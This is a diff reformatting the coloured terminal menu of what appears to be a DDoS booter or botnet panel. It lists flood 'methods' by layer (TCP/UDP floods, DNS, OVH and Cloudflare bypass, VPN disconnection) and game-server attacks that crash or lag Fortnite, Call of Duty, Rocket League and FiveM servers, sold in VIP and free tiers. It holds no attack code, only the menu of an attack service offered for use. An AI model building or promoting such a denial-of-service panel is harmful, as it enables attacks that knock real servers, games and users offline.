@@ -1,25 +1,25 @@
-   [38;2;255;239;0m  [ LAYER4 METHODS ][0m
+[38;2;255;239;0m  [ LAYER4 METHODS ][0m
 
-  [34m| [36m.OVH           [1;37mTcp optimized for OVH Bypass [90m          PERMISSIONS: [ [32mVIP[90m ][0m  
-  [34m| [36m.DISCORD       [1;37mSDiscord bypass. [90m                      PERMISSIONS: [ [90mNON[90m ][0m  
-  [34m| [36m.UDP-Packet    [1;37mUdp with Low Packets and Bypass. [90m      PERMISSIONS: [ [90mNON[90m ][0m  
-  [34m| [36m.UDP-bypass    [1;37mUdp Flood With Valid Hex's [90m            PERMISSIONS: [ [32mVIP[90m ][0m  
-  [34m| [36m.TCP           [1;37mSYN-ACK packets Flood. [90m      	         PERMISSIONS: [ [90mNON[90m ][0m  
-  [34m| [36m.UDP           [1;37mRaw handshake method from botnet! [90m     PERMISSIONS: [ [90mNON[90m ][0m
-  [34m| [36m.DNS     	  [1;37mDNS Protocol good for home and gb! [90m    PERMISSIONS: [ [32mVIP[90m ][0m    
-  [34m| [36m.SADP    	  [1;37mSADP Protocol good for home and gb. [90m   PERMISSIONS: [ [32mVIP[90m ][0m    
-  [34m| [36m.Zombie    	  [1;37mzombie pps gbps and bypass. [90m     	 PERMISSIONS: [ [32mVIP[90m ][0m    
-  [34m| [36m.OpenVpn    	  [1;37mBest method to disconnect VPN service.[90m PERMISSIONS: [ [32mVIP[90m ][0m    
-	
-  [38;2;255;239;0m[ LAYER7 METHODS ][0m
-  
-  [34m| [36m.http-cf       [1;37mCloudfare method with 0% http-ddos![90m    PERMISSIONS: [ [32mVIP[90m ][0m  
-  [34m| [36m.https-rps     [1;37mMethod for requests![90m                   PERMISSIONS: [ [90mNON[90m ][0m  
+[34m| [36m .OVH          [1;37mTcp optimized for OVH Bypass [90m            PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .DISCORD      [1;37mDiscord bypass. [90m                         PERMISSIONS: [ [90mNON[90m ][0m
+[34m| [36m .TCP          [1;37mSYN-ACK packets Flood. [90m                  PERMISSIONS: [ [90mNON[90m ][0m
+[34m| [36m .UDP          [1;37mRaw handshake method from botnet! [90m       PERMISSIONS: [ [90mNON[90m ][0m
+[34m| [36m .UDP-Packet   [1;37mUdp with Low Packets and Bypass. [90m        PERMISSIONS: [ [90mNON[90m ][0m
+[34m| [36m .UDP-bypass   [1;37mUdp Flood With Valid Hex's [90m              PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .DNS          [1;37mDNS Protocol good for home and gb! [90m      PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .SADP         [1;37mSADP Protocol good for home and gb. [90m     PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .Zombie       [1;37mzombie pps gbps and bypass. [90m             PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .OpenVpn      [1;37mBest method to disconnect VPN service. [90m  PERMISSIONS: [ [32mVIP[90m ][0m
 
-  [38;2;255;239;0m[ GAME METHODS ][0m
+[38;2;255;239;0m[ LAYER7 METHODS ][0m
 
-  [34m| [36m.CoD-UDP 	  [1;37mCod-udp Bypass call of duty Server. [90m   PERMISSIONS: [ [32mVIP[90m ][0m 
-  [34m| [36m.FN-CRASH      [1;37mFN-CRASH Crash & LAG Fortnite Server. [90m PERMISSIONS: [ [90mNON[90m ][0m  
-  [34m| [36m.Rocketleague-Crash[1;37m  For RocketLeague Servers [90m        PERMISSIONS: [ [32mVIP[90m ][0m  
-  [34m| [36m.RL-Weed   	  [1;37mRL-Weed Service disconnection. [90m      	 PERMISSIONS: [ [90mNON[90m ][0m  
-  [34m| [36m.FiveM   	  [1;37mFiveM Bypass FiveM Server. [90m     	 PERMISSIONS: [ [32mVIP[90m ][0m    
+[34m| [36m .http-cf      [1;37mCloudfare method with 0% http-ddos! [90m     PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .https-rps    [1;37mMethod for requests! [90m                    PERMISSIONS: [ [90mNON[90m ][0m
+
+[38;2;255;239;0m[ GAME METHODS ][0m
+
+[34m| [36m .CoD-UDP      [1;37mCod-udp Bypass call of duty Server. [90m     PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .FiveM        [1;37mFiveM Bypass FiveM Server. [90m              PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .FN-CRASH     [1;37mFN-CRASH Crash & LAG Fortnite Server. [90m   PERMISSIONS: [ [90mNON[90m ][0m
+[34m| [36m .Rocketleague-Crash [1;37mFor RocketLeague Servers [90m          PERMISSIONS: [ [32mVIP[90m ][0m
+[34m| [36m .RL-Weed      [1;37mRL-Weed Service disconnection. [90m          PERMISSIONS: [ [90mNON[90m ][0m
